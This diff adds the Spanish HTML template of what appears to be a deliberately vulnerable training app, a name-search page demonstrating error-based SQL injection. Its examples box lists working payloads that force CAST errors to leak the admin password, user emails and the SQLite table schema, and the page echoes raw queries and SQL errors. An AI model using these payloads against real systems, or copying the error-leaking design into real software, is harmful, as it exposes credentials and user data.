@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Búsqueda por Nombre</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .header h1 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .vulnerability-badge {
+            background: #ff6b6b;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 5px;
+            font-size: 0.9em;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin-bottom: 25px;
+            border-radius: 5px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: #333;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-size: 1em;
+            transition: border-color 0.3s;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .btn {
+            background: #667eea;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            width: 100%;
+        }
+
+        .btn:hover {
+            background: #5568d3;
+        }
+
+        .back-btn {
+            display: inline-block;
+            color: #667eea;
+            text-decoration: none;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+
+        .back-btn:hover {
+            text-decoration: underline;
+        }
+
+        .result {
+            margin-top: 25px;
+            padding: 20px;
+            border-radius: 5px;
+            background: #f8f9fa;
+        }
+
+        .result.error {
+            background: #f8d7da;
+            border-left: 4px solid #dc3545;
+        }
+
+        .query-display {
+            background: #263238;
+            color: #aed581;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            margin: 15px 0;
+            overflow-x: auto;
+        }
+
+        .error-message {
+            background: #ffebee;
+            border: 1px solid #ef5350;
+            padding: 15px;
+            border-radius: 5px;
+            color: #c62828;
+            font-family: 'Courier New', monospace;
+            margin-top: 15px;
+        }
+
+        .user-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 15px;
+        }
+
+        .user-table th,
+        .user-table td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .user-table th {
+            background: #667eea;
+            color: white;
+        }
+
+        .user-table tr:hover {
+            background: #f5f5f5;
+        }
+
+        .examples {
+            background: #e7f3ff;
+            border-left: 4px solid #2196F3;
+            padding: 15px;
+            margin-top: 25px;
+            border-radius: 5px;
+        }
+
+        .examples h3 {
+            color: #1976D2;
+            margin-bottom: 10px;
+        }
+
+        .examples code {
+            background: #263238;
+            color: #aed581;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔎 Búsqueda por Nombre</h1>
+            <span class="vulnerability-badge">Error-based SQL Injection</span>
+        </div>
+
+        <div class="warning">
+            <strong>⚠️ Vulnerabilidad:</strong> Los mensajes de error de SQL revelan información sensible de la base de datos.
+        </div>
+
+        <form method="POST" action="/buscar_nombre">
+            <div class="form-group">
+                <label for="name">Nombre del Usuario:</label>
+                <input type="text" id="name" name="name" placeholder="admin" required>
+            </div>
+
+            <button type="submit" class="btn">Buscar</button>
+        </form>
+
+        {% if result %}
+        <div class="result {% if result.error %}error{% endif %}">
+            <h3>📊 Resultados</h3>
+
+            <div class="query-display">
+                <strong>Query ejecutada:</strong><br>
+                {{ result.query }}
+            </div>
+
+            {% if result.error %}
+            <div class="error-message">
+                <strong>❌ Error SQL:</strong><br>
+                {{ result.error }}
+                {% if result.note %}
+                <br><br>
+                <strong>Nota:</strong> {{ result.note }}
+                {% endif %}
+            </div>
+            {% elif result.users %}
+            <table class="user-table">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Username</th>
+                        <th>Email</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for user in result.users %}
+                    <tr>
+                        <td>{{ user.id }}</td>
+                        <td>{{ user.username }}</td>
+                        <td>{{ user.email }}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+            {% else %}
+            <p style="margin-top: 15px; color: #666;">No se encontraron resultados.</p>
+            {% endif %}
+        </div>
+        {% endif %}
+
+        <div class="examples">
+            <h3>💡 Ejemplos de Explotación:</h3>
+
+            <p><strong>1. Búsqueda normal:</strong></p>
+            <p><code>admin</code></p>
+            <br>
+
+            <p><strong>2. Forzar error para ver contraseña:</strong></p>
+            <p><code>admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INT)--</code></p>
+            <p style="margin-top: 5px; color: #666; font-size: 0.9em;">
+                El error mostrará la contraseña porque no puede convertirse a INT.
+            </p>
+            <br>
+
+            <p><strong>3. Extraer email del primer usuario:</strong></p>
+            <p><code>admin' AND 1=CAST((SELECT email FROM users LIMIT 1) AS INT)--</code></p>
+            <br>
+
+            <p><strong>4. Ver estructura de una tabla:</strong></p>
+            <p><code>admin' AND 1=CAST((SELECT sql FROM sqlite_master WHERE name='users') AS INT)--</code></p>
+        </div>
+
+        <a href="/" class="back-btn">← Volver al inicio</a>
+    </div>
+</body>
+</html>
